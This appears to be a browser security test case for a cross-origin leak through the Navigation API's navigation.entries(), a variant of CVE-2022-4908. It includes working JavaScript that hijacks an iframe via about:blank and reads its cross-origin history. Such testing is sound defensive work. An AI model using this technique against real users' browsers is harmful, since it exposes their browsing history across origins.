Navigation API navigation.entries() Cross-Origin Leak

ID: UXSS-CHROME-01 CVE: CVE-2022-4908 (variant test) Browsers: Chrome, Opera, Edge Category: UXSS / SOP Bypass

Description

Tests whether the Navigation API's navigation.entries() leaks cross-origin URL history from iframes navigated to about:blank. In CVE-2022-4908, calling navigation.entries() in a hijacked iframe returned the history array connected to the origin that was present before navigating to about:blank.

This test checks if modern browsers still expose any cross-origin navigation entries after iframe navigation, including variants with fragment navigations and pushState.

Technique

// 1. Create iframe pointing to cross-origin (ebniw.com) // 2. Wait for load, then navigate iframe to about:blank // 3. Access iframe.contentWindow.navigation.entries() // 4. Check if entries contain cross-origin URLs const frame = document.createElement('iframe'); frame.src = 'https://ebniw.com/'; document.body.appendChild(frame); frame.onload = () => { // Navigate to about:blank (same-origin with parent) frame.contentWindow.location = 'about:blank'; setTimeout(() => { try { const nav = frame.contentWindow.navigation; if (nav) { const entries = nav.entries(); // Check for leaked cross-origin URLs entries.forEach(e => { if (e.url && e.url.includes('ebniw.com')) { // VULNERABLE: cross-origin URL leaked } }); } } catch(e) { /* blocked by SOP */ } }, 1000); };
